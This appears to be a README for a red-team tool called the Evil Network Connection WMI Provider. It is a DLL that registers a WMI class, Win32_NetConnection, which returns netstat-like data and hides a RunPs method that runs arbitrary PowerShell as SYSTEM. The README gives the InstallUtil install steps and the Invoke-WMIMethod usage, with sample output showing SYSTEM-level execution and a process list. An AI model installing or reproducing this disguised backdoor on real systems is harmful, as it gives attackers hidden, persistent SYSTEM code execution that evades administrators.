Evil Network Connection WMI Provider
- Returns Netstat like Information when queried
- Contains a RunPs Method that executes arbitrary PowerShell as System

To install:
- Download and unzip project
- Open administrator prompt
- cd to directory containing EvilNetConnectionWMIProvider.dll (<downloadpath>\EvilNetConnectionWMIProvider-master\EvilNetConnectionWMIProvider\bin\Debug)
- run "InstallUtil.exe /i EvilNetConnectionWMIProvider.dll"
-- Uninstall "InstallUtil.exe /u EvilNetConnectionWMIProvider.dll"

To use:
- Open PowerShell
-- Get-WMIObject Win32_NetConnection
--- returns netstat information (Active TCP Connections, TCP Listeners, UDP Listeners)
-- Invoke-WMIMethod -Class Win32_NetConnection -Name RunPs -ArgumentList "<powershell command>", $NULL

Examples 1:
Invoke-WMIMethod -Class Win32_NetConnection -Name RunPs -ArgumentList "whoami", $NULL

__GENUS          : 2
__CLASS          : __PARAMETERS
__SUPERCLASS     :
__DYNASTY        : __PARAMETERS
__RELPATH        :
__PROPERTY_COUNT : 1
__DERIVATION     : {}
__SERVER         :
__NAMESPACE      :
__PATH           :
ReturnValue      : nt authority\system


Invoke-WMIMethod -Class Win32_NetConnection -Name RunPs -ArgumentList "Get-Process", $NULL

__GENUS          : 2
__CLASS          : __PARAMETERS
__SUPERCLASS     :
__DYNASTY        : __PARAMETERS
__RELPATH        :
__PROPERTY_COUNT : 1
__DERIVATION     : {}
__SERVER         :
__NAMESPACE      :
__PATH           :
ReturnValue      : Handles  NPM(K)    PM(K)      WS(K) VM(M)   CPU(s)     Id ProcessName
                   -------  ------    -----      ----- -----   ------     -- -----------
                      1053      56    46364      37780   466    23.28   2260 chrome
                       138      18    25716       1300   201     0.51   2340 chrome
                       204      26    86716      42364   267    12.39   2820 chrome
                       184      24    89464       2476   354     2.54   3356 chrome
                       220      29    80648      67928   347    75.16   3992 chrome
                        53       6     2348       8340    60     0.16   1620 conhost
                        33       5      960       2780    22     0.00   2112 conhost
                       480      11     2192       1680    43     4.62    336 csrss
                       308      15     6332       3280   167     3.00    428 csrss
                       191      15     4244        704    56     0.72   2004 dllhost
                       150      16    64388      42996   151    15.58   2416 dwm
                       803      48    38536      16940   255     6.13   2448 explorer
                         0       0        0         24     0               0 Idle
                       575      19     4012       2752    38     1.62    480 lsass
                       203      10     2908       1260    30     0.22    488 lsm
                        88      10     3464       1752    39     0.23   3520 mscorsvw
                        79       8     4276       1492    36     0.36   3732 mscorsvw
                       148      17     3380        280    61     0.25   1932 msdtc
                       351      25    56256      55196   571     1.15   2256 powershell
                       215      13     5180       3284    39     2.64    464 services
                        30       1      436        104     4     0.06    248 smss
                       330      23     7484       1860    97     0.14   1180 spoolsv
                       169       9     7824        332    45     3.06   2492 sppsvc
                       112       7     2132       1300    26     0.14    212 svchost
                       702      41    16232      10168   380     2.95    272 svchost
                       365      14     4440       2888    42     2.68    636 svchost
                       285      16     4340       3540    35     0.90    712 svchost
                       472      23    17420       6480    74     1.31    776 svchost
                       483      25   140276     127700   216    19.53    868 svchost
                       573      22     7300       5196    71     1.95    920 svchost
                      2004     626   997868     827040  1443   660.40    956 svchost
                       319      33    11448       4672    67     2.87   1208 svchost
                        96       8     1700        336    43     0.05   1724 svchost
                       121      12     2024       1536    29     0.06   2912 svchost
                       362      45    66784      25088   214    21.03   3776 svchost
                       562       0      108         48     3               4 System
                       215      20     8616       1508    95     0.20   2308 taskhost
                       280      18    55820      46852   327   228.54   3824 TrustedInstaller
                       307      23     7364       4208    90     3.88   1360 vmtoolsd
                       267      24    13024       4572   128     5.10   2632 vmtoolsd
                        75       9     1476        224    44     0.27    408 wininit
                       120      10     2776        260    53     0.64    552 winlogon
                       260      34    59360      54492   554     0.84   2192 WmiPrvSE
                       115      10     2200        996    33     0.05   3244 WmiPrvSE
                        98       9     1980       2372    71     0.09   3740 wuauclt
